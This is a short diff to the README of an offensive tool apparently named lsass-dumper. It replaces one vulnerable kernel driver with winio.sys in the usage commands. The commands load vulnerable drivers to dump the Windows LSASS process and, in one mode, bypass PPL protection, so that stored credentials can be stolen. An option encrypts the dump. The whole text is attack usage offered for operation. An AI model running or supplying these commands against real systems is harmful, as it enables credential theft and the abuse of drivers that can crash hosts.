@@ -272,11 +272,11 @@ cargo build --release
 # Mode 1: viragt64 — virtual memory R/W (requires PPL bypass)
 lsass-dumper.exe -d viragt64.sys -s viragt64 -t viragt -m seclogon
 
-# Mode 2: sfdrvx64 — DM_KernelSyscall (no PPL bypass needed)
-lsass-dumper.exe -d sfdrvx64.sys -s speedfan -t sfdrv
+# 模式 2：sfdrvx64 — DM_KernelSyscall（无需 PPL 绕过,建议使用 winio.sys）
+lsass-dumper.exe -d winio.sys -s winio -t winio
 
 # With encryption
-lsass-dumper.exe -d sfdrvx64.sys -s speedfan -t sfdrv --encrypt
+lsass-dumper.exe -d winio.sys -s winio -t winio --encrypt
 
 # Allow driver unload (dangerous for viragt64 — may BSOD)
 lsass-dumper.exe --no-unload=false
